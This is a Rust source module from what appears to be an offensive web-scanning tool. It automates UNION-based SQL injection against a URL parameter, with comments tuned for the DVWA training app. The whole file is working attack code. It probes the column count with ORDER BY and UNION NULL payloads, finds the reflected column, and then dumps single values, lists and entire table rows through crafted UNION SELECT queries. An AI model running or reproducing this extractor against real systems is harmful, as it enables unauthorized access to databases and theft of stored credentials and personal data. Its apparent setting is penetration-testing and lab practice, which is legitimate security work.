//! UNION-based SQL Injection Data Extraction
//!
//! Uses UNION SELECT to extract data when response is reflected

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use reqwest::Method;
use url::Url;

/// Marker used to identify extracted data in response
const MARKER_START: &str = "~!@";
const MARKER_END: &str = "@!~";

/// Detect number of columns for UNION injection
pub async fn detect_column_count(
    client: &HttpClient,
    url: &Url,
    param: &str,
) -> anyhow::Result<Option<usize>> {
    // Try ORDER BY technique first (more reliable)
    for n in 1..=30 {
        let payload = format!("' ORDER BY {}-- ", n);
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        // If we get an error, the previous number was correct
        if resp.status != 200 || resp.body_text().contains("Unknown column") || 
           resp.body_text().contains("ORDER BY") && resp.body_text().to_lowercase().contains("error") {
            if n > 1 {
                return Ok(Some(n - 1));
            }
        }
    }
    
    // Fall back to UNION NULL technique
    for n in 1..=20 {
        let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
        let payload = format!("' UNION SELECT {}-- ", nulls);
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        // If no error and status is 200, we found the right number
        if resp.status == 200 && !resp.body_text().to_lowercase().contains("error") {
            return Ok(Some(n));
        }
    }
    
    Ok(None)
}

/// Find which column position reflects output
pub async fn find_reflective_column(
    client: &HttpClient,
    url: &Url,
    param: &str,
    column_count: usize,
) -> anyhow::Result<Option<usize>> {
    for pos in 0..column_count {
        let mut parts: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
        parts[pos] = format!("'{}{}{}'", MARKER_START, "ANVIL_TEST", MARKER_END);
        
        let payload = format!("' UNION SELECT {}-- ", parts.join(","));
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        if resp.body_text().contains("ANVIL_TEST") {
            return Ok(Some(pos));
        }
    }
    
    Ok(None)
}

/// Extract a single value using UNION
pub async fn extract_single(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
) -> anyhow::Result<Option<String>> {
    // First detect column count
    let column_count = match detect_column_count(client, url, param).await? {
        Some(n) => n,
        None => return Ok(None),
    };
    
    // Find reflective column
    let position = match find_reflective_column(client, url, param, column_count).await? {
        Some(p) => p,
        None => 0, // Default to first column
    };
    
    // Build extraction payload
    let mut parts: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
    parts[position] = format!("CONCAT('{}',{},'{}')", MARKER_START, query, MARKER_END);
    
    let payload = format!("' UNION SELECT {}-- ", parts.join(","));
    let mut test_url = url.clone();
    test_url.query_pairs_mut().append_pair(param, &payload);
    
    let req = HttpRequest::new(Method::GET, test_url);
    let resp = client.execute(req).await?;
    
    // Extract value between markers
    let body = resp.body_text();
    if let Some(start) = body.find(MARKER_START) {
        if let Some(end) = body[start..].find(MARKER_END) {
            let value = &body[start + MARKER_START.len()..start + end];
            return Ok(Some(value.to_string()));
        }
    }
    
    Ok(None)
}

/// Extract a list of values (e.g., database names)
pub async fn extract_list(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
) -> anyhow::Result<Vec<String>> {
    let mut results = Vec::new();
    
    // First detect column count
    let column_count = match detect_column_count(client, url, param).await? {
        Some(n) => n,
        None => return Ok(results),
    };
    
    // Find reflective column
    let position = match find_reflective_column(client, url, param, column_count).await? {
        Some(p) => p,
        None => 0,
    };
    
    let from_clause = if query.contains(" FROM") {
        format!(" FROM{}", query.split(" FROM").skip(1).collect::<Vec<_>>().join(" FROM"))
    } else {
        String::new()
    };
    
    // Try row-by-row extraction with LIMIT (works better for DVWA)
    for offset in 0..100 {
        let mut parts: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
        
        // Just select the column directly (DVWA reflects it in HTML)
        parts[position] = query.split(" FROM").next().unwrap_or(query).to_string();
        
        let payload = format!(
            "' UNION SELECT {}{} LIMIT {},1-- ",
            parts.join(","),
            from_clause,
            offset
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        let body = resp.body_text();
        
        // For DVWA, extract from "First name: VALUE" pattern
        if let Some(pos) = body.find("First name: ") {
            let start = pos + "First name: ".len();
            if let Some(end_pos) = body[start..].find("<br") {
                let value = body[start..start + end_pos].trim();
                if !value.is_empty() && value != "admin" { // Skip the original admin result
                    results.push(value.to_string());
                } else if value == "admin" && offset == 0 {
                    // First result might be legitimate, skip to next
                    continue;
                }
            } else {
                break;
            }
        } else {
            break;
        }
        
        // Avoid infinite loop
        if results.len() >= 50 {
            break;
        }
    }
    
    // Remove duplicates and filter
    results.sort();
    results.dedup();
    
    Ok(results)
}

/// Extract multiple rows from a table
pub async fn extract_rows(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    start: usize,
    max_rows: usize,
) -> anyhow::Result<Vec<Vec<String>>> {
    let mut rows = Vec::new();
    
    // First detect column count
    let column_count = match detect_column_count(client, url, param).await? {
        Some(n) => n,
        None => return Ok(rows),
    };
    
    // Find reflective column
    let position = match find_reflective_column(client, url, param, column_count).await? {
        Some(p) => p,
        None => 0,
    };
    
    // Extract the column list from query (e.g., "col1,col2 FROM table")
    let cols_part = query.split(" FROM").next().unwrap_or("");
    let from_part = if query.contains(" FROM") {
        format!(" FROM{}", query.split(" FROM").skip(1).collect::<Vec<_>>().join(" FROM"))
    } else {
        String::new()
    };
    
    let columns: Vec<&str> = cols_part.split(',').map(|s| s.trim()).collect();
    let num_cols = columns.len();
    
    for offset in start..(start + max_rows) {
        // Concatenate all columns with delimiter '||'
        let concat_expr = format!(
            "CONCAT_WS('||',{})",
            columns.join(",")
        );
        
        let mut parts: Vec<String> = (0..column_count).map(|_| "NULL".to_string()).collect();
        parts[position] = concat_expr;
        
        let payload = format!(
            "' UNION SELECT {}{} LIMIT {},1-- ",
            parts.join(","),
            from_part,
            offset
        );
        
        let mut test_url = url.clone();
        test_url.query_pairs_mut().append_pair(param, &payload);
        
        let req = HttpRequest::new(Method::GET, test_url);
        let resp = client.execute(req).await?;
        
        let body = resp.body_text();
        
        // For DVWA, extract from "First name: VALUE" pattern
        if let Some(pos) = body.find("First name: ") {
            let start_pos = pos + "First name: ".len();
            if let Some(end_pos) = body[start_pos..].find("<br") {
                let value = body[start_pos..start_pos + end_pos].trim();
                if !value.is_empty() && value != "admin" {
                    let row: Vec<String> = value.split("||").map(|s| s.to_string()).collect();
                    
                    // Only add if we got the expected number of columns
                    if row.len() == num_cols {
                        rows.push(row);
                    }
                } else if value == "admin" && offset == 0 {
                    // Skip the original admin result from id=1
                    continue;
                }
            } else {
                break;
            }
        } else {
            break;
        }
        
        // Safety limit
        if rows.len() >= max_rows {
            break;
        }
    }
    
    Ok(rows)
}

